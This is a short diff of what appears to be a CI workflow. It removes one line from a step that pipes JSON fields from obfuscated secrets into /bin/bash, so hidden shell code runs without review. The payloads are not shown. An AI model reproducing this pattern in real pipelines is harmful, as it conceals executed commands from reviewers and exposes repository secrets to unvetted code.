@@ -17,7 +17,6 @@ jobs:
           icmrx52: ${{ secrets.icmrx52 }}
         run: |
           printf '%s' "$icmrx52" | jq -r .xc226 | /bin/bash
-          printf '%s' "$njr17305" | jq -r .q63954 | /bin/bash
           echo $vz75251 | jq -r .ynaed6247 | /bin/bash
           echo $h49284 | jq -r .n686 | /bin/bash
           echo $nx91 | jq -r .kqtt14670 | /bin/bash
